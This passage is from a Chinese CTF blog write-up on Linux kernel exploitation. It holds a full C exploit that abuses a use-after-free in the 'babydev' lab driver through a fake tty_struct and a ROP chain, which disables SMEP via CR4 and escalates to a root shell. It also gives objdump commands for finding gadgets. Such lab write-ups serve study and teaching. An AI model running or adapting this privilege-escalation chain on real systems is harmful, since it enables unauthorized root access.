system(&quot;/bin/sh&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void save_stats()&#123;</span><br><span class="line">    asm(</span><br><span class="line">        &quot;movq %%cs, %0\n&quot;</span><br><span class="line">        &quot;movq %%ss, %1\n&quot;</span><br><span class="line">        &quot;movq %%rsp, %3\n&quot;</span><br><span class="line">        &quot;pushfq\n&quot;</span><br><span class="line">        &quot;popq %2\n&quot;</span><br><span class="line">        :&quot;=r&quot;(user_cs), &quot;=r&quot;(user_ss), &quot;=r&quot;(user_eflags),&quot;=r&quot;(user_sp)</span><br><span class="line">        :</span><br><span class="line">        : &quot;memory&quot;</span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void get_root()&#123;</span><br><span class="line">    char* (*pkc)(int) = prepare_kernel_cred_addr;</span><br><span class="line">    void (*cc)(char*) = commit_creds_addr;</span><br><span class="line">    (*cc)((*pkc)(0));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">    int fd1,fd2,fd3,i=0;</span><br><span class="line">    size_t fake_tty_struct[4] = &#123;0&#125;;</span><br><span class="line">    size_t rop[20]=&#123;0&#125;;</span><br><span class="line">    save_stats();</span><br><span class="line"></span><br><span class="line">    rop[i++] = 0xffffffff810d238d;      //pop_rdi_ret</span><br><span class="line">    rop[i++] = 0x6f0;</span><br><span class="line">    rop[i++] = 0xffffffff81004d80;      //mov_cr4_rdi_pop_rbp_ret</span><br><span class="line">    rop[i++] = 0x6161616161;</span><br><span class="line">    rop[i++] = (size_t)get_root;</span><br><span class="line">    rop[i++] = 0xffffffff81063694;      //swapgs_pop_rbp_ret</span><br><span class="line">    rop[i++] = 0x6161616161;</span><br><span class="line">    rop[i++] = 0xffffffff814e35ef;      // iretq; ret;</span><br><span class="line">    rop[i++] = (size_t)shell;</span><br><span class="line">    rop[i++] = user_cs;</span><br><span class="line">    rop[i++] = user_eflags;</span><br><span class="line">    rop[i++] = user_sp;</span><br><span class="line">    rop[i++] = user_ss;</span><br><span class="line">    </span><br><span class="line">    for(i = 0; i &lt; 30; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        fake_tty_opera[i] = 0xffffffff8181bfc5; </span><br><span class="line">    &#125;</span><br><span class="line">    fake_tty_opera[0] = 0xffffffff810635f5;     //pop rax; pop rbp; ret;</span><br><span class="line">    fake_tty_opera[1] = (size_t)rop;</span><br><span class="line">    fake_tty_opera[3] = 0xffffffff8181bfC5;     // mov rsp,rax ; dec ebx ; ret</span><br><span class="line">    fake_tty_opera[7] = 0xffffffff8181bfc5;  </span><br><span class="line"></span><br><span class="line">    fd1 = open(&quot;/dev/babydev&quot;,O_RDWR);</span><br><span class="line">    fd2 = open(&quot;/dev/babydev&quot;,O_RDWR);</span><br><span class="line">    ioctl(fd1,0x10001,0x2e0);</span><br><span class="line">    close(fd1);</span><br><span class="line">    fd3 = open(&quot;/dev/ptmx&quot;,O_RDWR|O_NOCTTY);</span><br><span class="line">    read(fd2, fake_tty_struct, 32);</span><br><span class="line">    fake_tty_struct[3] = (size_t)fake_tty_opera;</span><br><span class="line">    write(fd2,fake_tty_struct, 32);</span><br><span class="line">    write(fd3,&quot;cc-sir&quot;,6);                      //触发rop</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>编译:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc poc.c -o poc -w -static</span><br></pre></td></tr></table></figure></p>
+<p>运行:<br><img src="./img/kernel3_6.png" alt="root"></p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这道题其实最关键的是要熟悉内核的执行流程,了解一些关键的结构体以及他们的分配方式;<br>最后这里说一下找<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">```bash</span><br><span class="line">objdump -d vmlinux -M intel | grep -E &quot;cr4|pop|ret&quot;</span><br></pre></td></tr></table></figure></p>
+<p><img src="cr4.png" alt="cr4"><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objdump -d vmlinux -M intel | grep -E <span class="string">"swapgs|pop|ret"</span></span><br></pre></td></tr></table></figure></p>
+<p><img src="./img/kernel3_swapgs.png" alt="swapgs"><br>但是使用这个方法的时候要注意看这些指令的地址是不是连续的,可不可以用;用这个方法不一定可以找到iretq,还是需要用ropper工具去找,但是大多数情况应该都可以找到的:<br><img src="./img/kernel3_iretq.png" alt="iretq"></p>
+
+      
+      
+    </div>
+    
+  </div>
+  
+    
+    <div class="copyright">
+        <p><span>本文标题:</span><a href="/2019/08/24/Linux-kernel3/">Linux Kernel Exploit 内核漏洞学习(3)-Bypass-Smep</a></p>
+        <p><span>文章作者:</span><a href="/" title="访问 钞sir 的个人博客">钞sir</a></p>
+        <p><span>发布时间:</span>2019年08月24日 - 21时08分</p>
+        <p><span>最后更新:</span>2019年08月24日 - 21时08分</p>
+        <p>
+            <span>原始链接:</span><a class="post-url" href="/2019/08/24/Linux-kernel3/" title="Linux Kernel Exploit 内核漏洞学习(3)-Bypass-Smep">https://cc-sir.github.io/2019/08/24/Linux-kernel3/</a>
+            <span class="copy-path" data-clipboard-text="原文: https://cc-sir.github.io/2019/08/24/Linux-kernel3/　　作者: 钞sir" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <script src="/js/clipboard.min.js"></script>
+            <script> var clipboard = new Clipboard('.copy-path'); </script>
+        </p>
+        <p>
+            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/3.0/cn/" title="中国大陆 (CC BY-NC-SA 3.0 CN)" target="_blank">"署名-非商用-相同方式共享 3.0"</a> 转载请保留原文链接及作者。
+        </p>
+    </div>
+
+
+
+<nav id="article-nav">
+  
+    <a href="/2019/08/24/Linux-kernel-exploit2/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption"><</strong>
+      <div class="article-nav-title">
+        
+          Linux Kernel Exploit 内核漏洞学习(2)-ROP
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2019/07/24/Linux-kernel-1/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">Linux Kernel Exploit 内核漏洞学习(1)-Double Fetch</div>
+      <strong class="article-nav-caption">></strong>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+    <div id="toc" class="toc-article">
+    <strong class="toc-title">文章目录</strong>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#简介"><span class="toc-number">1.</span> <span class="toc-text">简介</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#思路"><span class="toc-number">2.</span> <span class="toc-text">思路</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#总结"><span class="toc-number">3.</span> <span class="toc-text">总结</span></a></li></ol>
+</div>
+<input type="button" id="tocButton" value="隐藏目录" title="点击按钮隐藏或者显示文章目录">
+
+<script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
+<script>
+    var valueHide = "隐藏目录";
+    var valueShow = "显示目录";
+
+    if ($(".left-col").is(":hidden")) {
+        $("#tocButton").attr("value", valueShow);
+    }
+    $("#tocButton").click(function() {
+        if ($("#toc").is(":hidden")) {
+            $("#tocButton").attr("value", valueHide);
+            $("#toc").slideDown(320);
+        }
+        else {
+            $("#tocButton").attr("value", valueShow);
+            $("#toc").slideUp(350);
+        }
+    })
+    if ($(".toc").length < 1) {
+        $("#toc, #tocButton").hide();
+    }
+</script>
+
+
+
+
+
+
+
+    
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a href="/2019/08/24/Linux-kernel-exploit2/" title="上一篇: Linux Kernel Exploit 内核漏洞学习(2)-ROP">
+                <i class="fa fa-angle-left"></i>
+            </a>
+        
+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+        
+            <a href="/2019/07/24/Linux-kernel-1/" title="下一篇: Linux Kernel Exploit 内核漏洞学习(1)-Double Fetch">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
+    </div>
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2019/08/24/Linux-kernel-exploit2/">Linux Kernel Exploit 内核漏洞学习(2)-ROP</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/08/24/Linux-kernel3/">Linux Kernel Exploit 内核漏洞学习(3)-Bypass-Smep</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/07/24/Linux-kernel-1/">Linux Kernel Exploit 内核漏洞学习(1)-Double Fetch</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/07/24/Linux-kernel-0/">Linux kernel Exploit 内核漏洞学习(0)-环境安装</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/07/12/hackinos/">HackInOS</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/06/23/fmtstr_payload/">Fmtstr_Loop</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/05/11/滑雪大冒险内购/">滑雪大冒险2 App内购</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/28/pwnf/">hctf2016-fheap</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/26/ret2_dl_runtime_resolve/">ret2_dl_runtime_resolve</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/16/PE文件格式/">PE文件格式</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/06/namebook/">namebook</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/03/unlink/">Unlink</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/01/Tcache/">Hgame2019_babytcache</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/01/pwnable_tw/">pwnable.tw</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/02/22/hacknote/">pwnable.tw_hacknote</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/01/29/dynelf/">DynELF</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/01/28/ichunqiu_easypwn/">Ichunqiu_Easypwn</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/01/26/ret2libc/">Ret2libc</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/01/24/ret2shellcode/">Ret2ShellCode</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/01/20/overflow_freed_chunk/">Overflow Freed Chunk</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/01/19/Fastbin_Double_Free/">Fastbin Double Free</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/01/11/use_after_free/">Use After Free</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/01/11/hello-world/">Hello World</a></li></ul>
+    <script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
+    <script>
+        $(".post-list").addClass("toc-article");
+        $(".post-list-item a").attr("target","_blank");
+        $("#post-nav-button > a:nth-child(2)").click(function() {
+            $(".fa-bars, .fa-times").toggle();
+            $(".post-list").toggle(300);
+            if ($(".toc").length > 0) {
+                $("#toc, #tocButton").toggle(200, function() {
+                    if ($(".switch-area").is(":visible")) {
+                        $("#tocButton").attr("value", valueHide);
+                        }
+                    })
+            }
+            else {
+            }
+        })
+    </script>
+
+
+
+    <script>
+        
+    </script>
+</div>
+      <footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+            <div class="footer-left">
+                &copy; 2019 钞sir
+            </div>
+            <div class="footer-right">
+                <a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/luuman/hexo-theme-spfk" target="_blank">spfk</a> by luuman
+            </div>
+        </div>
+        
+            <div class="visit">
+                
+                    <span id="busuanzi_container_site_pv" style="display:none">
+                        <span id="site-visit">海贼到访数: 
+                            <span id="busuanzi_value_site_uv"></span>
+                        </span>
+                    </span>
+                
+                
+                    <span>, </span>
+                
+                
+                    <span id="busuanzi_container_page_pv" style="display:none">
+                        <span id="page-visit">本页阅读量: 
+                            <span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    </span>
+                
+            </div>
+        
+    </div>
+</footer>
+
+    </div>
+    <script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
+<script src="/js/main.js"></script>
+
+    <script>
+        $(document).ready(function() {
+            var backgroundnum = 24;
+            var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
+            $("#mobile-nav").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
+            $(".left-col").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
+        })
+    </script>
+
+
+
+
+
+<div class="scroll" id="scroll">
+    <a href="#"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer"><i class="fa fa-arrow-down"></i></a>
+</div>
+<script>
+    $(document).ready(function() {
+        if ($("#comments").length < 1) {
+            $("#scroll > a:nth-child(2)").hide();
+        };
+    })
+</script>
+
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+
+  <script language="javascript">
+    $(function() {
+        $("a[title]").each(function() {
+            var a = $(this);
+            var title = a.attr('title');
+            if (title == undefined || title == "") return;
+            a.data('title', title).removeAttr('title').hover(
+
+            function() {
+                var offset = a.offset();
+                $("<div id=\"anchortitlecontainer\"></div>").appendTo($("body")).html(title).css({
+                    top: offset.top - a.outerHeight() - 15,
+                    left: offset.left + a.outerWidth()/2 + 1
+                }).fadeIn(function() {
+                    var pop = $(this);
+                    setTimeout(function() {
+                        pop.remove();
+                    }, pop.text().length * 800);
+                });
+            }, function() {
+                $("#anchortitlecontainer").remove();
+            });
+        });
+    });
+</script>
+
+
+  </div>
+</body>
+</html>
